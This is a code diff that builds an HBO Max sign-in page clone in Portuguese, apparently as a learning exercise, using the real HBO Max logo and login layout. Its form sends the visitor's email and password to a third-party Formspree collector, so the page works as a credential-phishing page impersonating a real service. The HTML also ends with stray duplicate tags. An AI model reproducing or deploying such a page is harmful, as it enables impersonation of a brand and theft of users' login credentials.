@@ -1,12 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+<!--tudo que fara o site funicionar fica na tag head-->
+<head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Static Template</title>
-  </head>
-  <body>
-    <h1>This is a static template, there is no bundler or bundling involved!</h1>
-  </body>
+    <title>site-dnc</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;400;700&display=swap" rel="stylesheet">
+   <!--inicio de uma aplicação de javascript-->
+    <script src="https://kit.fontawesome.com/990e161777.js" crossorigin="anonymous"></script>
+   <!--final da aplicação do jvascript--> 
+   <!--inicio do comando para importar tudo que ta no html para o CSS-->
+    <link rel="stylesheet" href="hbo.css">
+    <!--final do comando de importação do html para o CSS-->
+</head>
+<!--inicio da aplicação do html, o corpo do site para estruturar para o CSS-->
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="gray" id="menu">
+                <ul>
+                    <li id="menuBars"><i class="fa-solid fa-bars"></i></li>
+                    <li id="search"><i class="fa-solid fa-magnifying-glass"></i></li>
+                </ul>
+            </div>
+            <div id="img"><img src="https://www.hbomax.com/img/hbo-max-h-w-l.svg" width="130px"></div>
+            <div class="gray">
+                <ul>
+                    <li id="sign">Assinar</li>
+                    <li id="in">Entrar</li>
+                </ul>
+            </div>
+        </div>
+        <div class="login">
+            <div id="enter">
+                <h1>Entrar</h1>
+            </div>
+            <div class="gray" id="text1">
+                <p>Você tem uma conta HBO Max?</p>
+            </div>
+        </div>    
+        <div class="login">
+            <form action="https://formspree.io/f/mgeqwzdl" method="POST">
+                <div class="gray" id="email">
+                    <p>
+                        <label id="loginTitle">E-mail</label><br> 
+                        <input id="login" type="email" required="required" name="email">               
+                    </p>
+                </div>
+                <div class="gray" id="password">
+                    <p>
+                        <label id="loginTitle">Senha</label><br>
+                        <input id="login" type="password" required="required" name="password">             
+                    </p>
+                </div>
+                <div id="button">
+                    <button id="entrar" type="submit">Entrar</button>
+                </div>
+                <div class="gray" id="text2">
+                    <p>Você acessa a HBO Max por um provedor<br>de TV, de internet ou celular?</p>
+                </div>
+                <div id="button">
+                    <button id="provedor" type="button">Entrar como Provedor</button>
+                    <br>
+                    <br>
+                    <br>
+                </div>
+            </form> 
+        </div>    
+    </div>  
+</body>
+</html>
+</head>
+<body>
+    
+</body>
 </html>
